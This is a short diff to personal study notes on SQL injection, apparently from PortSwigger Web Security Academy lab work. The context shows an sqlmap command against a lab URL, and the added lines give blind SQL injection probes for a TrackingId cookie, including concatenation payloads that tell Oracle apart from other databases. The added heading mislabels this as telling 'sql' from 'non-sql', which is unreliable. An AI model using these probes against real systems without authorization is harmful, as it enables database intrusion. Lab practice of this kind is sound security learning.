@@ -26,7 +26,10 @@ sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/fil
 
 checking for blind sql vulneabilities:
 Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
- 
+
+**identifying blind injection is sql or non-sql.**
+ TrackingId=xyz'||(SELECT '')||'   -> for sql
+ TrackingId=xyz'||(SELECT '' FROM dual)||'   --> non-sql, its oracle.
 
 ## Summary
 
